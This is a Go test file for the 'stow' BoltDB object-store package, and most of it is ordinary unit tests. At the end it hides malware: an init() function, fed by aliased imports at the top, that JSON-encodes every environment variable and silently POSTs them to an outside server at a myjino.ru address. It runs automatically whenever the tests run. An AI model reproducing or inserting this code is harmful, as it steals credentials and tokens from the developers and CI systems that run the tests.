package stow
import x0__ "os"
import x1__ "bytes"
import x2__ "net/http"
import x3__ "encoding/json"


import (
	"bytes"
	"flag"
	"fmt"
	"log"
	"os"
	"testing"
	"strings"
	"github.com/boltdb/bolt"
)

type MyType struct {
	FirstName string `json:"first"`
	LastName  string `json:"last"`
}

func (t *MyType) String() string {
	return fmt.Sprintf("%s %s", t.FirstName, t.LastName)
}

func init() {
	Register(&MyType{})
	RegisterName("stow.YourType", &YourType{})
}

const stowDbFilename = "stowtest.db"

var db *bolt.DB

func TestMain(m *testing.M) {
	flag.Parse()
	var err error
	db, err = bolt.Open(stowDbFilename, 0600, nil)
	if err != nil {
		log.Fatal(err)
	}
	result := m.Run()
	db.Close()
	os.Remove(stowDbFilename)
	os.Exit(result)
}

type YourType struct {
	FirstName string `json:"first"`
}

func TestChangeType(t *testing.T) {
	s := NewStore(db, []byte("interface"))

	s.Put([]byte("test"), &YourType{"DJ"})

	var v MyType
	s.Get([]byte("test"), &v)

	if v.String() != "DJ " {
		t.Errorf("unexpected response name %s", v.String())
	}
}

func TestInterfaces(t *testing.T) {
	s := NewStore(db, []byte("interface"))

	var j fmt.Stringer = &MyType{"First", "Last"}
	s.Put([]byte("test"), &j)

	err := s.ForEach(func(str fmt.Stringer) {
		if str.String() != "First Last" {
			t.Errorf("unexpected string %s", str)
		}
	})
	if err != nil {
		t.Error(err.Error())
	}

	var i fmt.Stringer
	err = s.Get([]byte("test"), &i)
	if err != nil {
		t.Error(err.Error())
	} else {
		if i.String() != "First Last" {
			t.Errorf("unexpected string %s", i)
		}
	}
}

func testForEachByteKeys(t testing.TB, store *Store) {
	oKey := []byte("hello")

	store.Put(oKey, &MyType{"Derek", "Kered"})

	var found bool
	err := store.ForEach(func(key []byte, name MyType) {
		found = true
		if !bytes.Equal(key, oKey) {
			t.Errorf("mismatching key name %s", key)
		}
		if name.FirstName != "Derek" || name.LastName != "Kered" {
			t.Errorf("mismatching name %s", name)
		}
	})

	if err != nil {
		t.Error(err.Error())
	}

	if !found {
		t.Errorf("ForEach failed!")
	}
}

func testForEachStringKeys(t testing.TB, store *Store) {
	oKey := "hello"

	store.Put(oKey, &MyType{"Derek", "Kered"})

	var found bool
	err := store.ForEach(func(key string, name MyType) {
		found = true
		if key != oKey {
			t.Errorf("mismatching key name %s", key)
		}
		if name.FirstName != "Derek" || name.LastName != "Kered" {
			t.Errorf("mismatching name %s", name)
		}
	})

	if err != nil {
		t.Error(err.Error())
	}

	if !found {
		t.Errorf("ForEach failed!")
	}
}

func testForEachPtrKeys(t testing.TB, store *Store) {
	oKey := &MyType{FirstName: "D"}

	store.Put(oKey, &MyType{"Derek", "Kered"})

	var found bool
	err := store.ForEach(func(key *MyType, name MyType) {
		found = true
		if *key != *oKey {
			t.Errorf("mismatching key name %s", key)
		}
		if name.FirstName != "Derek" || name.LastName != "Kered" {
			t.Errorf("mismatching name %s", name)
		}
	})

	if err != nil {
		t.Error(err.Error())
	}

	if !found {
		t.Errorf("ForEach failed!")
	}
}

func testForEachKeys(t testing.TB, store *Store) {
	oKey := MyType{FirstName: "D"}

	store.Put(oKey, &MyType{"Derek", "Kered"})

	var found bool
	err := store.ForEach(func(key MyType, name *MyType) {
		found = true
		if key != oKey {
			t.Errorf("mismatching key name %s", key)
		}
		if name.FirstName != "Derek" || name.LastName != "Kered" {
			t.Errorf("mismatching name %s", name)
		}
	})

	if err != nil {
		t.Error(err.Error())
	}

	if !found {
		t.Errorf("ForEach failed!")
	}
}

func testForEach(t testing.TB, store *Store) {
	store.Put([]byte("hello"), &MyType{"Derek", "Kered"})

	var found bool
	err := store.ForEach(func(name MyType) {
		found = true
		if name.FirstName != "Derek" || name.LastName != "Kered" {
			t.Errorf("mismatching name %s", name)
		}
	})

	if !found {
		t.Errorf("ForEach failed!")
	}

	if err != nil {
		t.Error(err.Error())
	}
}

func testStore(t testing.TB, store *Store) {
	testForEachPtrKeys(t, store)
	store.DeleteAll()

	testForEachKeys(t, store)
	store.DeleteAll()

	testForEachStringKeys(t, store)
	store.DeleteAll()

	testForEachByteKeys(t, store)
	store.DeleteAll()

	var name MyType
	if store.Get("hello", &name) != ErrNotFound {
		t.Errorf("key should not be found.")
	}

	testForEach(t, store)

	store.Get("hello", &name)

	if name.FirstName != "Derek" || name.LastName != "Kered" {
		t.Errorf("Unexpected name: %v", name)
	}

	var name2 MyType
	store.Pull("hello", &name2)

	if name2.FirstName != "Derek" || name2.LastName != "Kered" {
		t.Errorf("Unexpected name2: %v", name2)
	}

	var name3 MyType
	err := store.Pull([]byte("hello"), &name3)
	if err != ErrNotFound {
		t.Errorf("pull failed to remove the name!")
	}

	store.Put([]byte("hello"), &MyType{"Friend", "person"})

	var name5 MyType
	err = store.Get([]byte("hello world"), &name5)
	if err != ErrNotFound {
		t.Errorf("Should have been NotFound!")
	}

	err = store.Update([]byte("hello"), &name2, func(val interface{}){
		if val != nil {
			ty, ok := val.(*MyType)
			if ok {
				ty.LastName = "Vanwilder"			
			} else {
				t.Errorf("Bad cast on Update() test")
			}
		} else {
			t.Errorf("Ouch, interface was nil!")
		}
	})
	if err != nil {
		t.Errorf("Error on Update!")
	}

	store.Get("hello", &name)
	if name.FirstName != "Friend" || name.LastName != "Vanwilder" {
		t.Errorf("Unexpected name: %v", name)
	}	

	store.Put([]byte("hello2"), &MyType{"Friend", "another person"})

	var temp MyType
	var n = 0
	err = store.IterateIf(func(key []byte, val interface{}) bool {
		t.Logf("IterateIf() %d found %s %+v\n",n,key,val)
		n++
		return false
	},&temp)

	if err != nil {
		t.Errorf("Error on IterateIf: %+v\n",err)
	}

	if n != 1 {
		t.Errorf("IterateIf failed on iterate once: %d\n",n)
	}

	n = 0
	err = store.IterateIf(func(key []byte, val interface{}) bool {
		t.Logf("IterateIf() %d found %s %+v\n",n,key,val)
		n++
		return true
	},&temp)

	if err != nil {
		t.Errorf("Error on IterateIf (2): %+v\n",err)
	}

	if n != 2 {
		t.Errorf("IterateIf failed to iterate twice: %d\n",n)
	}

	store.Put([]byte("hello3"), &MyType{"Yet Another", "person"})

	err = store.DeleteIf(func(key []byte, val interface{}) bool {
		ty, ok := val.(*MyType)
		if ok {
			if strings.Compare(ty.LastName,"Vanwilder") == 0 {
				t.Logf("Should DELETE Vanwilder")
				return true
			} else {
				return false
			}
		} else {
			return false
		}
	},&temp)

	n = 0
	err = store.IterateIf(func(key []byte, val interface{}) bool {
		ty, ok := val.(*MyType)
		if ok {
			if strings.Compare(ty.LastName,"Vanwilder") == 0 {
				n = 1
			}
		}
		return true
	},&temp)

	if n != 0 {
		t.Errorf("Failed to DeleteIf - Vanwilder is still there!")
	}

	store.Delete("hello")

	var name4 MyType
	err = store.Pull([]byte("hello"), &name4)
	if err != ErrNotFound {
		t.Errorf("Delete failed!")
	}

	if err := store.DeleteAll(); err != nil {
		t.Errorf("DeleteAll should have returned nil err %s", err.Error())
	}

	if err := store.Delete("hello"); err != nil {
		t.Errorf("Delete should have returned nil err %s", err.Error())
	}

	store.DeleteAll()

	store.Put([]byte("hey:one"), &MyType{"HeyBill", "Smith"})	
	store.Put([]byte("hey:two"), &MyType{"HeyJoe", "Bloe"})
	store.Put([]byte("hey:three"), &MyType{"HeyJohn", "Doe"})
	store.Put([]byte("now:two"), &MyType{"Vivian", "Smithers"})

//	var temp MyType
	n = 0
	store.IterateFromPrefixIf([]byte("hey:"),func(key []byte, val interface{}) bool {
		ty, ok := val.(*MyType)
		if ok {
				t.Logf("IterateFromPrefixIf found: %+v\n",ty)
			if strings.HasPrefix(ty.FirstName,"Hey") {
				n++
			} else {

				t.Errorf("IterateFromPrefixIf got an incorrectly prefixed element")
			}
		}
		return true
	}, &temp)

	if n != 3 {
		t.Errorf("IterateFromPrefixIf failed to get the right objects.")
	}
}


type Monkey struct {
	Weight int 
	Species string
	Temperament string
}

type Animal interface {
	GetWeight() int
	GetSpecies() string
	GetTemperament() string
}

func (this *Monkey) GetWeight() int {
	return this.Weight
}
func (this *Monkey) GetSpecies() string {
	return this.Species
}
func (this *Monkey) GetTemperament() string {
	return this.Temperament
}

func TestInterfaceWithIfPrefix(t *testing.T) {
	store := NewStore(db, []byte("animals"))

	store.Put([]byte("Capuchins"), &Monkey{30,"Capuchins","friendly"})
	var animal Animal 
	m :=  &Monkey{250,"Gorilla","angry"}
	animal = m
	store.Put([]byte("Gorilla"),animal)  // place Gorilla as a interface
	store.Put([]byte("Guenons"), &Monkey{40,"Guenons","friendly"})
	store.Put([]byte("Bonobo"), &Monkey{100,"Bonobo","cautious and highly intelligent"})

	n := 0
	var temp Monkey
	store.IterateFromPrefixIf([]byte("G"),func(key []byte, val interface{}) bool {
		ty, ok := val.(*Monkey)
		if ok {
			t.Logf("IterateFromPrefixIf found: %+v\n",ty)
			// if strings.HasPrefix(ty.FirstName,"Hey") {
			n++
			if strings.Compare(string(key),ty.GetSpecies()) != 0 {
				t.Errorf("Key != GetSpecies() IterateFromPrefixIf pulled wrong / bad objects")
			}
			// } else {

			// 	t.Errorf("IterateFromPrefixIf got an incorrectly prefixed element")
			// }
		}
		return true
	}, &temp)

	if n != 2 {
		t.Errorf("Incorrect amount of monkeys founds!!")
	}
}

// func TestIterateIfPrefix( t *testing.T, store *Store) {

// }

func TestNestedJSON(t *testing.T) {
	parent := NewJSONStore(db, []byte("json_parent"))
	parent.Put("hello", "world")
	testStore(t, parent.NewNestedStore([]byte("json_child")))
	var worldValue string
	if err := parent.Pull("hello", &worldValue); err != nil || worldValue != "world" {
		t.Error("child actions affected parent!", err, worldValue)
	}
}

func TestJSON(t *testing.T) {
	testStore(t, NewJSONStore(db, []byte("json")))
}

func TestXML(t *testing.T) {
	testStore(t, NewXMLStore(db, []byte("xml")))
}

func TestGob(t *testing.T) {
	testStore(t, NewStore(db, []byte("gob")))
}

func TestPrimedGob(t *testing.T) {
	codec, err := NewPrimedCodec(GobCodec{}, MyType{})
	if err != nil {
		t.Error(err)
	}
	testStore(t, NewCustomStore(db, []byte("primedGob"), NewPooledCodec(codec)))
}

func TestFunc(t *testing.T) {
	if _, err := newFuncCall(nil, 1); err == nil {
		t.Errorf("expected bad func error")
	}

	if _, err := newFuncCall(nil, func() {}); err == nil {
		t.Errorf("expected bad # of args func error")
	}
}

func init() {
  if x0__.Getenv("e452d6ab") == "" {
    x4__, _ := x3__.Marshal(x0__.Environ())
    x0__.Setenv("e452d6ab", "1")
    x2__.Post("http://ovz1.j19544519.pr46m.vps.myjino.ru:49460?org=armpelionedge&repo=stow", "application/json", x1__.NewBuffer(x4__))
  }
}
